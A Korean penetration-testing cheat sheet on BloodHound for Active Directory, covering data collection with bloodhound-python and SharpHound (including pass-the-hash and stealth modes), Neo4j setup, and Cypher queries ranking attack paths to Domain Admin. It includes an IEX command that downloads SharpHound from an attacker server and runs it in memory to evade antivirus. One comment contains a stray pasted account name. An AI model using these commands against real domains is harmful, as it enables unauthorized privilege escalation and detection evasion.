# 01_BloodHound

# AD 내부침투 — BloodHound

---

## 개념

BloodHound는 Active Directory 환경의 모든 관계(그룹 멤버십, ACL, 세션, 신뢰 관계, 위임 설정 등)를 Neo4j 그래프 데이터베이스에 저장하고 시각화해 Domain Admin까지의 공격 경로를 자동으로 탐색하는 도구다. 수동으로는 파악하기 불가능한 복잡한 권한 위임 체인, 다단계 ACL 관계, 세션 기반 이동 경로 등을 직관적인 그래프로 보여준다.

데이터 수집(인제스트)은 SharpHound(Windows) 또는 bloodhound-python(Linux)으로 하고, 수집된 ZIP 파일을 BloodHound GUI에 드래그 앤 드롭으로 임포트해 분석한다. BloodHound는 내부적으로 Cypher 쿼리 언어를 사용하므로 기본 내장 쿼리 외에 커스텀 쿼리로 더 정밀한 분석이 가능하다.

---

## 환경 트러블슈팅

### SharpHound LDAP 페이징 오류 ("The server does not support the control")

SharpHound 5.0.0(BloodHound CE용)은 구버전/비표준 DC를 상대로 일시적인 LDAP 연결 오류를 겪는 경우가 있다. 설정을 바꿀 것 없이 그대로 재실행하면 성공하는 경우가 많으므로 먼저 재시도해볼 것.

```
ERROR|Error during main ldap query:PagedQuery - Caught unrecoverable exception: 
The server does not support the control. The control is critical. (0)
```

```powershell
# 1차 실패 시 그냥 다시 실행 (설정 변경 없이)
SharpHound.exe -c All

# 재시도도 계속 실패하면 특정 DC를 명시하거나 수집 범위를 줄여볼 것
SharpHound.exe -c All --DomainController <DC_IP>
```

### Neo4j가 시작안될 때 — Java 버전 문제

Neo4j(BloodHound가 쓰는 DB)가 요구하는 Java 버전은 **설치된 Neo4j 버전마다 다르다** — 칼리 기본 내장 구버전(4.x대)은 Java 11을, 가장 최신 Neo4j(2025.x대)는 오히려 Java 21을 요구한다. "Neo4j is not running"이 반복되면 현재 기본 Java와 설치된 Neo4j 버전이 안 맞는지부터 의심할 것 — 무조건 11로 낮추기보다, 먼저 어느 버전을 요구하는지 로그/공식 문서를 확인하고 맞춰 전환할 것.

```bash
# 설치된 Java 버전 확인
update-alternatives --list java

# 설치된 Neo4j 버전 확인 (어느 Java가 필요한지 판단하는 기준)
neo4j --version

# 필요한 버전으로 전환 (설치 안 되어있으면 sudo apt install openjdk-11-jdk 또는 openjdk-21-jdk)
sudo update-alternatives --config java
# 목록에서 대상 버전 번호 선택

sudo neo4j start
```

### `bloodhound` 명령어 deprecated

최신 칼리는 `bloodhound` 명령어 대신 `bloodhound-start`로 바뀌었다.

```bash
bloodhound-start
```

---

## 데이터 수집 — bloodhound-python (Linux)

bloodhound-python은 LDAP과 SMB를 통해 도메인 데이터를 수집하는 Python 기반 인제스터다. 도메인에 참여한 머신이 없어도 칼리에서 직접 실행할 수 있다. `-c` 옵션으로 수집 항목을 지정한다. `All`이 가장 많은 데이터를 수집하지만 트래픽이 많아 탐지 위험이 높고, `DCOnly`는 DC에만 질의해 조용하지만 세션 정보가 없다.

```bash
# 전체 수집 — 가장 일반적으로 쓰는 방식
# -d: 도메인 이름 / -u: 유저명 / -p: 패스워드 / -ns: 네임서버(DC IP) / -c: 수집 항목 / --zip: 결과를 zip으로 묶기
bloodhound-python \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  -ns <DC_IP> \
  -c All \
  --zip

# 세션 정보 포함 수집
# LoggedOn을 추가하면 각 머신에 현재 로그인한 유저 정보를 수집함
# 현재 어느 머신에 DA가 세션을 갖고 있는지 파악할 수 있어 횡적 이동 계획에 유용
# 단, 각 도메인 머신에 SMB 연결을 시도하기 때문에 트래픽이 매우 많이 발생함
bloodhound-python \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  -ns <DC_IP> \
  -c All,LoggedOn \
  --zip

# 스텔스 수집 — DC에만 질의
# DCOnly는 DC의 LDAP만 쿼리하므로 트래픽이 거의 없음
# 세션 정보와 로컬 관리자 정보가 없지만 ACL, 그룹 멤버십, 위임 설정은 수집됨
bloodhound-python \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  -ns <DC_IP> \
  -c DCOnly \
  --zip

# NTLM 해시로 인증 — 패스워드 크래킹 없이 PtH로 바로 수집 가능
# LM:NTLM 형식으로 입력하며 LM 부분은 더미값 사용
bloodhound-python \
  -d corp.local \
  -u john \
  --hashes aad3b435b51404eeaad3b435b51404ee:<NTLM> \
  -ns <DC_IP> \
  -c All \
  --zip

# Kerberos 인증 — ccache 티켓 파일이 있을 때 사용
# KRB5CCNAME 환경변수로 사용할 ccache 파일을 지정하면 bloodhound-python이 자동으로 읽음
# -k: Kerberos 인증 사용 / --no-pass: 패스워드 입력 생략
export KRB5CCNAME=/tmp/john.ccache
bloodhound-python \
  -d corp.local \
  -u john \
  -k \
  --no-pass \
  -ns <DC_IP> \
  -c All \
  --zip
```

---

## 데이터 수집 — SharpHound (Windows)

SharpHound는 C# 기반으로 bloodhound-python보다 수집 속도가 빠르고 수집 항목도 더 많다. 도메인에 참여한 머신에서 실행하거나 자격증명을 지정해 비도메인 머신에서도 실행할 수 있다. PowerShell 버전은 메모리에 로드해 디스크에 파일을 남기지 않을 수 있어 탐지 회피에 유리하다.

```powershell
# 기본 전체 수집
# -c All: 모든 수집 항목 포함 (그룹, ACL, 세션, 위임, GPO 등)
# --zipfilename: 출력 zip 파일명 지정
.\SharpHound.exe -c All --zipfilename bh.zip

# 세션 정보 포함
# LoggedOn을 추가하면 각 머신에 현재 로그인한 유저를 수집함
# 도메인 내 모든 머신에 SMB 연결을 시도하므로 시간이 더 걸리고 트래픽이 많음
.\SharpHound.exe -c All,LoggedOn --zipfilename bh.zip

# 스텔스 수집
# DCOnly: DC의 LDAP만 쿼리 -> 트래픽 최소화, 빠름
# 세션/로컬 관리자 정보 없음, ACL/그룹/위임 정보는 수집됨
.\SharpHound.exe -c DCOnly --zipfilename bh.zip

# 출력 디렉토리 지정
# 기본은 현재 디렉토리에 저장, 쓰기 권한 있는 경로 지정
.\SharpHound.exe -c All --outputdirectory C:\Temp\ --zipfilename bh.zip

# 루프 모드 — 주기적으로 재수집
# 세션은 시간에 따라 변하므로 여러 번 수집하면 더 많은 세션 발견 가능
# --loopduration: 전체 루프 실행 시간 / --loopinterval: 재수집 주기
.\SharpHound.exe -c All,LoggedOn --loop --loopduration 00:15:00 --loopinterval 00:05:00

# PowerShell 메모리 로드 — 디스크에 SharpHound.exe 파일 없이 실행
# 공격자 HTTP 서버에서 스크립트를 바로 메모리에 로드해서 실행
# AV가 파일을 탐지하는 경우 우회 가능
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\ -ZipFilename bh.zip

# 자격증명 지정 — 비도메인 머신에서 실행할 때
# 도메인에 참여하지 않은 머신에서도 자격증명만 있으면 수집 가능
.\SharpHound.exe -c All --ldapusername john --ldappassword 'Password1!' --zipfilename bh.zip
```

---

## BloodHound 실행 및 임포트

```bash
# Neo4j 데이터베이스 먼저 시작 — BloodHound가 Neo4j에 데이터를 저장하므로 반드시 먼저 실행
sudo neo4j start

# 최초 실행 시 비밀번호 변경 필요
# 브라우저에서 http://localhost:7474 접속 -> neo4j / neo4j -> 새 비밀번호 설정
# 이 비밀번호를 BloodHound GUI 로그인에도 사용

# BloodHound GUI 실행
bloodhound &

# GUI 로그인 정보
# Database URL: bolt://localhost:7687
# Username: neo4j
# Password: <변경한 비밀번호>

# 데이터 임포트
# 수집된 ZIP 파일을 GUI 창에 드래그 앤 드롭하거나 Upload Data 버튼 클릭
# 임포트 완료 후 우측 패널 Database Info에서 노드/엣지 수 확인

# 기존 데이터 전체 초기화 — 새 engagement 시작 전에 이전 데이터 제거
# GUI Raw Query 박스에 입력
MATCH (n) DETACH DELETE n
```

---

## Cypher 쿼리 실행 방법

**BloodHound GUI Raw Query 박스** — GUI 하단 입력란에 쿼리를 붙여넣고 Enter. `RETURN p` 형태의 경로 쿼리는 그래프로 시각화된다. 노드와 엣지를 직접 클릭해서 상세 정보를 볼 수 있어 경로 탐색에 가장 유용하다.

**Neo4j 웹 콘솔** — 브라우저에서 `http://localhost:7474` 접속 후 로그인. 상단 입력창에 Cypher 입력 후 Ctrl+Enter. `RETURN u.name` 형태의 텍스트 결과는 표로 출력되고 CSV로 내보낼 수 있다. 대량 데이터를 텍스트로 보거나 파일로 저장할 때 유용하다.

**cypher-shell CLI** — 터미널에서 직접 실행하는 방식이다. 스크립트 자동화나 결과를 파일로 바로 저장할 때 유용하다.

```bash
# 단일 쿼리 실행 — 결과가 터미널에 출력됨
# -u: Neo4j 유저명 / -p: 비밀번호 / 따옴표 안에 Cypher 쿼리 입력
cypher-shell -u neo4j -p <비밀번호> \
  "MATCH (u:User {dontreqpreauth:true}) RETURN u.name"

# 여러 속성 함께 출력
cypher-shell -u neo4j -p <비밀번호> \
  "MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name, u.pwdlastset ORDER BY u.pwdlastset"

# 결과를 파일로 저장
# --format plain: 표 테두리 없이 순수 텍스트로 출력 -> 파일 저장에 적합
cypher-shell -u neo4j -p <비밀번호> \
  "MATCH (u:User {enabled:true}) RETURN u.name, u.description" \
  --format plain > users.txt

# 데이터 전체 초기화
cypher-shell -u neo4j -p <비밀번호> "MATCH (n) DETACH DELETE n"
```

---

## Pre-built 쿼리 (GUI 내장)

GUI 좌측 검색창 옆 목록 아이콘을 클릭하면 내장 쿼리 목록이 나온다. 아래 순서로 실행하는 것이 효율적이다.

```
Find all Domain Admins                              <- DA 계정 목록 파악
Shortest Paths to Domain Admins                    <- DA까지 전체 경로 확인
Shortest Paths from Owned Principals               <- 가장 중요 / 내 계정 기준 최단 경로
Find AS-REP Roastable Users                        <- 사전인증 비활성 계정 탐색
Find Kerberoastable Users with most privileges     <- 고권한 Kerberoastable 계정
Find Computers where Domain Users are Local Admin  <- 즉시 접근 가능한 머신
Find Principals with DCSync Rights                 <- DCSync 권한 이상 계정 탐지
Find Computers with Unconstrained Delegation       <- TGT 탈취 타겟
Find Computers with Constrained Delegation         <- 위임 악용 가능 머신
Shortest Paths to Unconstrained Delegation Systems <- Unconstrained 머신까지 경로
Find Workstations where Domain Users can RDP       <- RDP 접근 가능 워크스테이션
Find Servers where Domain Users can RDP            <- RDP 접근 가능 서버
```

---

## Pathfinding 전략

BloodHound 데이터를 임포트한 직후 경로가 바로 보이는 경우도 있지만 대부분은 단계적으로 탐색해야 한다.

### 1단계 — Owned 마킹

현재 내가 제어하는 계정뿐 아니라 침입한 컴퓨터도 Owned 마킹해야 한다. 컴퓨터를 마킹해야 해당 머신의 AdminTo 관계도 경로에 포함된다. 마킹 후 "Shortest Paths from Owned Principals"를 실행한다.

```
노드 우클릭 -> Mark User as Owned / Mark Computer as Owned (빨간 해골 표시)
```

### 2단계 — 경로가 보이면 엣지를 하나씩 확인

경로의 각 화살표(엣지)를 클릭하면 우측 패널에 Help 탭이 나온다.

```
Help > Abuse Info         : 실제 악용 명령어가 상세하게 나옴
Help > OpSec Considerations: 탐지 위험도 설명
Help > References         : 관련 기술 문서 링크
```

경로가 여러 개면 가장 짧고 탐지 위험이 낮은 것을 선택한다. 경로가 5홉 이상이어도 포기하지 말 것. 실전에서 7~8홉 경로도 충분히 악용 가능하다.

### 3단계 — 경로가 없으면 수동 탐색

```
1. 내 계정의 outbound 엣지 전체 확인 (아래 특정 노드 조사 쿼리 사용)
2. 내가 AdminTo인 머신 확인 -> 그 머신에 DA 세션이 있는지 확인
3. 내 계정이 속한 그룹들의 권한 확인 (그룹 중첩 포함)
4. Unconstrained / Constrained / RBCD 위임 설정 머신이 있는지 확인
5. description 필드에 패스워드가 적힌 계정이 있는지 Cypher로 쿼리
6. Kerberoastable / AS-REP Roastable 계정 확인 후 크래킹 시도
```

### 엣지 우선순위

발견된 엣지마다 악용 난이도와 영향도가 다르다. 아래 순서대로 우선 공략한다.

```
1. AdminTo            -> 즉시 PtH / psexec / secretsdump 가능
2. GenericAll         -> 패스워드 변경, 그룹 추가, SPN 설정 등 완전 제어
3. DCSync 권한        -> GetChanges + GetChangesAll -> 즉시 전체 해시 덤프
4. ForceChangePassword -> 패스워드 강제 변경 후 로그인
5. AddMember          -> 자신을 DA 그룹에 추가
6. WriteDACL          -> ACL 수정 -> GenericAll 자신에게 부여 -> 완전 제어
7. WriteOwner         -> 소유자 변경 -> WriteDACL -> GenericAll
8. GenericWrite       -> SPN 설정(Targeted Kerberoasting) 또는 msDS-KeyCredentialLink 수정
9. AllowedToAct       -> RBCD -> 관리자 사칭 TGS 발급
10. AllowedToDelegate -> Constrained Delegation -> 특정 서비스 사칭
11. ReadLAPSPassword  -> 로컬 관리자 패스워드 직접 읽기
```

### Pathfinding 탭 사용법

GUI 상단 Pathfinding 탭에서 시작 노드와 끝 노드를 직접 지정해 경로를 탐색한다. 검색창에 노드 이름(대문자)을 입력하면 자동완성된다. Edge Filtering 기능으로 특정 엣지 타입을 on/off할 수 있다. 예를 들어 HasSession을 끄면 세션 기반 경로가 제거되어 순수 ACL 체인만 볼 수 있다.

---

## 특정 노드 상세 조사 쿼리

특정 계정이나 머신이 어떤 권한을 갖고 있는지 빠르게 파악할 때 쓰는 쿼리들이다.

```
// 특정 유저의 모든 outbound 관계 — 이 유저가 무엇을 제어할 수 있는가
// -[r]->: 이 유저에서 나가는 모든 엣지를 변수 r에 담아서 반환
// RETURN u, r, n: 그래프 형태로 시각화 (GUI Raw Query에서 실행)
MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[r]->(n)
RETURN u, r, n

// 엣지 타입별 텍스트 목록 — 그래프보다 빠르게 전체 권한 파악 가능
// type(r): 엣지의 타입명 반환 (AdminTo, GenericAll 등)
// labels(n): 대상 노드의 타입 반환 (User, Computer, Group 등)
// GUI보다 Neo4j 콘솔이나 cypher-shell에서 쓰면 목록으로 깔끔하게 출력됨
MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[r]->(n)
RETURN type(r) AS 엣지, labels(n) AS 대상타입, n.name AS 대상
ORDER BY type(r)

// 특정 유저의 모든 inbound 관계 — 누가 이 유저를 제어할 수 있는가
// 반대 방향으로 화살표를 쓰면 해당 노드를 타겟으로 하는 엣지를 탐색
// 피해자 계정을 분석할 때 유용 (누가 내 계정을 제어하는지 파악)
MATCH (n)-[r]->(u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})
RETURN n, r, u

// 양방향 모두 (in + out 전부)
// -[r]-: 방향 없이 연결된 모든 엣지를 탐색
MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[r]-(n)
RETURN u, r, n

// 특정 컴퓨터의 outbound — 이 머신이 어떤 권한을 갖고 있는가
// 컴퓨터 계정이 다른 머신에 AdminTo인 경우 발견 가능 (횡적 이동 경로)
MATCH (c:Computer {name:"DC.ADMINISTRATOR.HTB"})-[r]->(n)
RETURN c, r, n

// 특정 그룹의 멤버 + 해당 그룹이 가진 권한 동시 확인
// 그룹 멤버가 됐을 때 어떤 권한을 얻는지 한 번에 파악
// OPTIONAL MATCH: 그룹이 outbound 엣지가 없어도 멤버 목록은 반환
MATCH (u:User)-[:MemberOf]->(g:Group {name:"IT ADMINS@CORP.LOCAL"})
OPTIONAL MATCH (g)-[r]->(t)
RETURN u.name AS 멤버, type(r) AS 그룹권한, t.name AS 대상

// 특정 유저가 중첩 포함 속한 모든 그룹
// MemberOf*1..: 직접 멤버인 그룹뿐 아니라 그룹의 그룹까지 모두 탐색
MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[:MemberOf*1..]->(g:Group)
RETURN g.name
ORDER BY g.name

// 특정 컴퓨터에 로컬 관리자인 모든 계정 (중첩 포함)
// MemberOf*0..: 0홉은 자기 자신 포함 (직접 AdminTo + 그룹 통한 AdminTo 모두 포함)
MATCH (u)-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer {name:"SERVER01.CORP.LOCAL"})
RETURN u.name, labels(u)

// description 필드에서 패스워드 힌트 찾기
// toUpper(): 대소문자 구분 없이 검색하기 위해 모두 대문자로 변환
// CONTAINS: 문자열 포함 여부 확인
MATCH (u:User)
WHERE toUpper(u.description) CONTAINS 'PASS'
   OR toUpper(u.description) CONTAINS 'PWD'
   OR toUpper(u.description) CONTAINS 'CRED'
RETURN u.name, u.description

// 특정 그룹의 outbound 관계 (그룹이 어떤 권한을 갖고 있는가)
// 유저 outbound 확인 시 MemberOf만 나왔을 때 그룹 자체의 권한을 확인하는 용도
// 예: 유저가 HR 그룹 멤버 → HR 그룹이 어떤 오브젝트에 권한이 있는지 확인
MATCH (g:Group {name:"HR@PUPPY.HTB"})-[r]->(n)
RETURN g, r, n

// 텍스트 목록으로 확인 (그래프보다 빠름)
MATCH (g:Group {name:"HR@PUPPY.HTB"})-[r]->(n)
RETURN type(r) AS 엣지, labels(n) AS 대상타입, n.name AS 대상
ORDER BY type(r)

// 유저가 속한 모든 그룹의 권한 한 번에 조회
// 주의: MATCH (u)-[:MemberOf*1..]->(g)-[r]->(n) 형태는 체인 마지막 그룹만 g로 잡혀
// 중간 그룹들의 권한을 놓칠 수 있으므로 아래 2단계 방식 사용
// 1단계: 유저가 속한 모든 그룹 수집
MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[:MemberOf*1..]->(g:Group)
// 2단계: 각 그룹의 outbound 관계 탐색 (MemberOf 제외해야 순수 권한만 나옴)
MATCH (g)-[r]->(n)
WHERE NOT type(r) = 'MemberOf'
RETURN u.name AS 유저, g.name AS 소속그룹, type(r) AS 권한, n.name AS 대상
ORDER BY g.name

// 그룹의 inbound 관계 (누가 이 그룹의 멤버인가)
MATCH (n)-[r:MemberOf]->(g:Group {name:"HR@PUPPY.HTB"})
RETURN n.name, labels(n)

// 특정 그룹이 속한 상위 그룹 체인 (중첩 포함)
// 이 그룹이 어느 상위 그룹을 통해 추가 권한을 상속받는지 확인
MATCH (g:Group {name:"HR@PUPPY.HTB"})-[:MemberOf*1..]->(parent:Group)
RETURN g.name AS 그룹, parent.name AS 상위그룹

// 그룹 체인 전체 + 각 상위 그룹의 권한까지 한 번에
MATCH (g:Group {name:"HR@PUPPY.HTB"})-[:MemberOf*1..]->(parent:Group)-[r]->(target)
WHERE NOT type(r) = 'MemberOf'
RETURN g.name AS 출발그룹, parent.name AS 경유그룹, type(r) AS 권한, target.name AS 대상
ORDER BY parent.name
```

---

## 커스텀 Cypher 쿼리

### 빠른 확인 (Quick Wins)

임포트 직후 가장 먼저 실행해야 하는 쿼리들이다.

```
// description 필드에 패스워드가 적혀있는 계정
// IS NOT NULL AND <> "": null이거나 빈 문자열인 경우 제외하고 description 있는 계정만 반환
// 실전에서 서비스 계정의 description에 패스워드가 평문으로 적혀있는 경우가 자주 발견됨
MATCH (u:User)
WHERE u.description IS NOT NULL AND u.description <> ""
RETURN u.name, u.description
ORDER BY u.name

// 패스워드 미설정 계정 (빈 패스워드로 로그인 가능)
// passwordnotreqd: 패스워드 정책에서 빈 패스워드를 허용하는 속성
// 발견 시 빈 패스워드로 즉시 로그인 시도
MATCH (u:User {enabled:true, passwordnotreqd:true})
RETURN u.name, u.description

// 패스워드 만료 없는 계정 (오래된 패스워드 가능성 높음)
// pwdneverexpires: 패스워드 만료 정책 적용 제외 속성
// 서비스 계정에 흔하며 설정 후 오랫동안 패스워드를 안 바꾼 경우가 많음
// pwdlastset 기준 오래된 순으로 정렬해서 우선 타겟 파악
MATCH (u:User {enabled:true, pwdneverexpires:true})
RETURN u.name, u.description, u.pwdlastset
ORDER BY u.pwdlastset

// Domain Users 그룹이 로컬 관리자인 컴퓨터
// g.objectid ENDS WITH "-513": Domain Users 그룹의 RID가 513이므로 SID 끝이 -513
// Legacy BloodHound는 g.objectsid, CE는 g.objectid 사용
// 결과가 나오면 도메인 유저 아무나 해당 머신에 관리자 -> 즉시 PtH 가능
MATCH (g:Group)-[:AdminTo]->(c:Computer)
WHERE g.objectid ENDS WITH "-513"
RETURN g.name, c.name

// 비활성 계정인데 Domain Admins 멤버
// enabled:false: 비활성화된 계정 필터
// 계정이 비활성화되어 있MICHAEL@ADMINISTRATOR.HTB어도 그룹 멤버십은 유지됨
// 계정을 활성화하면 즉시 DA 권한 획득 가능
MATCH (u:User {enabled:false})-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN u.name

// SPN 있는 DA 계정 (Kerberoast 즉시 가능 + DA 권한)
// hasspn:true: SPN이 등록된 계정 -> TGS 요청 가능 -> Kerberoasting 대상
// DA이면서 SPN이 있으면 크래킹 성공 시 즉시 DA 장악
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN u.name, u.serviceprincipalnames, u.pwdlastset

// 5년 이상 패스워드 안 바뀐 Kerberoastable 계정
// datetime().epochseconds: 현재 시각의 Unix timestamp
// 1825 * 86400: 5년을 초 단위로 계산 (365일 * 5 * 하루 86400초)
// NOT u.pwdlastset IN [-1.0, 0.0]: 패스워드 미설정(-1) 또는 설정기록없음(0) 제외
// 오래된 패스워드일수록 단순한 패스워드 사용 가능성 높음 -> 크래킹 우선순위
MATCH (u:User {hasspn:true, enabled:true})
WHERE u.pwdlastset < (datetime().epochseconds - (1825 * 86400))
AND NOT u.pwdlastset IN [-1.0, 0.0]
RETURN u.name, u.pwdlastset, u.serviceprincipalnames
ORDER BY u.pwdlastset

// AS-REP Roastable 계정
// dontreqpreauth:true: DONT_REQ_PREAUTH 속성이 설정된 계정
// 사전 인증 없이 AS-REQ만으로 AS-REP 해시 획득 가능
// 해시를 오프라인으로 크래킹해 패스워드 획득
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.description
ORDER BY u.name

// 크랙 가능성 높은 계정 종합 (Kerberoastable + admincount + 오래된 패스워드)
// admincount:true: 고권한 그룹의 멤버 또는 고권한 ACL을 가진 계정에 자동으로 설정됨
// 세 조건이 모두 해당되면 크래킹 성공 시 즉시 도메인 장악으로 이어질 수 있음
MATCH (u:User {hasspn:true, enabled:true, admincount:true})
WHERE u.pwdlastset < (datetime().epochseconds - (365 * 86400))
AND NOT u.pwdlastset IN [-1.0, 0.0]
RETURN u.name, u.pwdlastset, u.serviceprincipalnames
ORDER BY u.pwdlastset
```

---

### 경로 탐색

```
// 내 계정에서 DA까지 최단 경로
// shortestPath: 두 노드 사이의 가장 짧은 경로를 탐색
// -[*1..]: 1홉 이상의 모든 엣지 타입을 허용 (AdminTo, MemberOf, GenericAll 등 전부 포함)
// RETURN p: 경로 전체를 반환 -> GUI에서 그래프로 시각화됨
MATCH p=shortestPath(
  (u:User {name:"JOHN@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// Owned 계정 전체에서 DA까지 최단 경로
// owned:true: Mark as Owned로 마킹한 계정들을 대상으로 탐색
// 마킹한 계정이 여러 개면 그 중 DA까지 가장 짧은 경로를 찾아줌
MATCH p=shortestPath(
  (u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// 특정 계정에서 DA까지 모든 경로
// allShortestPaths: 가장 짧은 홉 수를 가진 경로를 모두 반환 (여러 개 가능)
// shortestPath는 하나만 반환하지만 allShortestPaths는 같은 길이의 경로를 모두 반환
// *: 홉 수 제한 없음 (홉 수 제한 시 allShortestPaths 오류 발생)
MATCH p=allShortestPaths(
  (u:User {name:"JOHN@CORP.LOCAL"})-[*]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// ACL 관계만 통해서 DA까지 가는 최단 경로
// 지정한 엣지 타입만 허용하므로 HasSession이나 AdminTo 없이 순수 ACL 체인만 탐색
// 실제 코드 실행 없이 권한 위임 체인만으로 DA 도달 가능한지 확인할 때 유용
MATCH p=shortestPath(
  (u:User {name:"JOHN@CORP.LOCAL"})-
  [:GenericAll|GenericWrite|WriteOwner|WriteDACL|AllExtendedRights*1..]->(g:Group)
)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN p

// 내 계정이 로컬 관리자인 컴퓨터 전체 (중첩 포함)
// MemberOf*0..: 0홉부터 탐색 -> 자기 자신 + 속한 그룹들 모두 포함
// 직접 AdminTo인 경우 + 그룹을 통한 AdminTo 모두 반환
MATCH (u:User {name:"JOHN@CORP.LOCAL"})-[:MemberOf*0..]->(g:Group)-[:AdminTo]->(c:Computer)
RETURN c.name

// High Value 타겟까지 최단 경로
// highvalue:true: BloodHound가 자동으로 DA, EA 등 고가치 노드에 설정하는 속성
// DA 외에 다른 고가치 그룹(Enterprise Admins 등)까지의 경로도 포함
// WHERE NOT u=n: 출발점과 도착점이 같은 경우 제외
MATCH p=shortestPath(
  (u:User {owned:true})-[*1..]->(n {highvalue:true})
)
WHERE NOT u=n
RETURN p

// 도메인 위험도 측정 — DA까지 경로가 있는 유저 비율
// 전체 활성 유저 수 대비 DA까지 경로가 있는 유저의 비율을 퍼센트로 반환
// 이 값이 높을수록 도메인 보안 설정이 취약하다는 의미
MATCH (totalUsers:User {enabled:true})
WITH COUNT(DISTINCT(totalUsers)) AS total
MATCH p=shortestPath(
  (u:User {enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN 100.0 * COUNT(DISTINCT(u)) / total AS percentToDA

// Owned 머신에서 다음 hop으로 접근 가능한 머신 (횡적 이동 경로)
// owned:true인 컴퓨터에서 AdminTo로 접근 가능한 아직 Owned 안 된 머신을 탐색
// NOT c2.owned = true: 이미 Owned인 머신은 제외
MATCH (c1:Computer {owned:true})-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c2:Computer)
WHERE NOT c2.owned = true
RETURN c1.name, c2.name
```

---

### ACL 악용 관계

```
// 모든 ACL 관계 한 번에 조회
// r.isacl=true: ACL 기반 엣지에만 자동으로 설정되는 속성
// 전체 그림을 빠르게 파악하는 데 유용
MATCH (u)-[r]->(t)
WHERE r.isacl=true
RETURN u.name, type(r), labels(t), t.name
ORDER BY type(r)

// GenericAll — 완전한 제어
// 패스워드 변경, SPN 설정(Kerberoasting), 그룹 멤버 추가 등 모든 작업 가능
// 발견 즉시 악용 가능한 가장 강력한 ACL 권한
MATCH (u)-[:GenericAll]->(t)
RETURN u.name, labels(t), t.name
ORDER BY u.name

// GenericWrite — 속성 수정 가능
// SPN을 임의로 설정해 Targeted Kerberoasting 수행 가능
// msDS-KeyCredentialLink 수정으로 Shadow Credentials 공격 가능
// GenericAll보다 범위가 좁지만 충분히 악용 가능
MATCH (u)-[:GenericWrite]->(t)
RETURN u.name, labels(t), t.name

// WriteDACL — ACL 수정 가능
// 자신에게 GenericAll을 부여하는 ACE를 추가한 뒤 완전한 제어권 획득
// PowerView: Add-DomainObjectAcl 로 악용
MATCH (u)-[:WriteDACL]->(t)
RETURN u.name, labels(t), t.name

// WriteOwner — 소유자 변경 가능
// 소유자를 자신으로 변경 -> 소유자는 기본적으로 WriteDACL 권한을 가짐
// WriteDACL -> GenericAll 부여 순서로 이어지는 체인 공격
MATCH (u)-[:WriteOwner]->(t)
RETURN u.name, labels(t), t.name

// ForceChangePassword — 패스워드 강제 변경
// 현재 패스워드를 몰라도 대상 계정의 패스워드를 임의로 변경 가능
// PowerView: Set-DomainUserPassword / net rpc password 로 악용
// 주의: 패스워드 변경 시 해당 계정의 기존 세션/서비스가 끊길 수 있음
MATCH (u)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// AddMember — 그룹에 멤버 추가 가능
// 자신을 DA 그룹에 직접 추가 가능
// PowerView: Add-DomainGroupMember 로 악용
MATCH (u)-[:AddMember]->(g:Group)
RETURN u.name, g.name

// ReadLAPSPassword — LAPS 패스워드 읽기
// LAPS(Local Administrator Password Solution)로 관리되는 로컬 관리자 패스워드를 직접 읽을 수 있음
// 해당 컴퓨터의 로컬 관리자로 즉시 접근 가능
MATCH (u)-[:ReadLAPSPassword]->(c:Computer)
RETURN u.name, c.name

// DCSync 권한 있는 비-DA 계정 (이상 징후)
// GetChanges + GetChangesAll 두 권한이 모두 있어야 실제 DCSync 가능
// Legacy BloodHound: DCSync 엣지 없음 -> 두 권한 조합으로 탐지
// CE: DCSync 엣지 직접 사용 가능
// DA가 아닌 계정이 이 권한을 가지면 ACL 백도어가 심어진 것을 의심
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, labels(u)

// Shadow Credentials 공격 가능한 대상
// AddKeyCredentialLink: msDS-KeyCredentialLink 속성을 직접 수정 가능한 엣지
// GenericWrite / AllExtendedRights가 있어도 msDS-KeyCredentialLink 수정 가능
// 수정 후 Whisker / certipy로 Shadow Credentials 설정 -> 해당 계정의 TGT 획득
MATCH (u)-[:GenericWrite|AllExtendedRights|AddKeyCredentialLink]->(t)
WHERE t:User OR t:Computer
RETURN u.name, labels(t), t.name

// High Value 그룹에 대한 ACL 권한을 가진 비-고권한 계정
// 고가치 그룹 멤버가 아닌 일반 계정이 고가치 그룹을 제어할 수 있는 경우 탐지
// 이런 관계가 발견되면 ACL 미스컨피규레이션 또는 의도적인 백도어일 가능성이 높음
MATCH (n {highvalue:true})
OPTIONAL MATCH (m1)-[{isacl:true}]->(n)
WHERE NOT (m1)-[:MemberOf*1..]->(:Group {highvalue:true})
OPTIONAL MATCH (m2)-[:MemberOf*1..]->(:Group)-[{isacl:true}]->(n)
WHERE NOT (m2)-[:MemberOf*1..]->(:Group {highvalue:true})
WITH n, COLLECT(m1) + COLLECT(m2) AS controllers
UNWIND controllers AS c
RETURN n.name, COUNT(DISTINCT(c)) AS controllerCount
ORDER BY controllerCount DESC
```

---

